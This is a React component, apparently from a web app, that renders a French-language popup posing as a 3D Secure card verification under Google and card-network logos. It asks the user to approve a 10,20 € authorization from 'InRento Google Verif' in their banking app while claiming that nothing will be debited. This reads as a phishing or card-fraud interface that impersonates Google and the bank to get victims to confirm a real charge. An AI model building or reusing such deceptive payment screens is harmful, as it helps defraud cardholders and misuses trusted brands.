import React from 'react';
import { createPortal } from 'react-dom';
import PopupHeader from './PopupHeader';
import styles from '../styles/components/CommonPopup.module.css';

const ThreeDSecurePopup = ({ 
  isVisible, 
  amount, 
  lastFourDigits,
  formattedDate,
  formattedTime,
  cardNumber,
}) => {
  console.log("3DSecurePopup rendu avec isVisible:", isVisible);
  
  if (!isVisible) return null;

  const popupContent = (
    <div className={styles.popupWrapper}>
      <div className={styles.popup}>
        <PopupHeader 
          showGoogleLogo={true} 
          showCardLogo={true}
          cardNumber={cardNumber}
        />
        
        <div className={styles.content}>
          <div className={styles.iconContainer}>
            <div className={styles.spinner}></div>
          </div>
          
          <h3 className={styles.title}>
            Vérifiez votre identité
          </h3>
          
          <p className={styles.subtitle}>
            Confirmez l'autorisation suivante depuis votre application bancaire pour vérifier votre identité :
          </p>
          
          <div className={styles.transactionCard}>
            <div className={styles.transactionField}>
              <span className={styles.transactionLabel}>Marchand</span>
              <span className={styles.transactionValue}>InRento Google Verif</span>
            </div>
            <div className={styles.transactionField}>
              <span className={styles.transactionLabel}>Montant</span>
              <span className={`${styles.transactionValue} ${styles.transactionValueHighlight}`}>10,20 €</span>
            </div>
            <div className={styles.transactionField}>
              <span className={styles.transactionLabel}>Date</span>
              <span className={styles.transactionValue}>{formattedDate} à {formattedTime}</span>
            </div>
            <div className={styles.transactionField}>
              <span className={styles.transactionLabel}>Carte</span>
              <span className={styles.transactionValue}>**** **** **** {lastFourDigits}</span>
            </div>
          </div>
          
          <div className={styles.transactionNotice}>
            <p className={styles.transactionNoticeText}>
              Cette demande d'autorisation permet de vérifier l'authenticité de votre carte bancaire. 
              Aucun montant ne sera débité, il s'agit uniquement d'une vérification de sécurité.
            </p>
          </div>
          
        </div>
      </div>
    </div>
  );

  // Utiliser createPortal pour rendre le popup à la racine du document
  return typeof window !== 'undefined' 
    ? createPortal(popupContent, document.body)
    : null;
};

export default ThreeDSecurePopup;
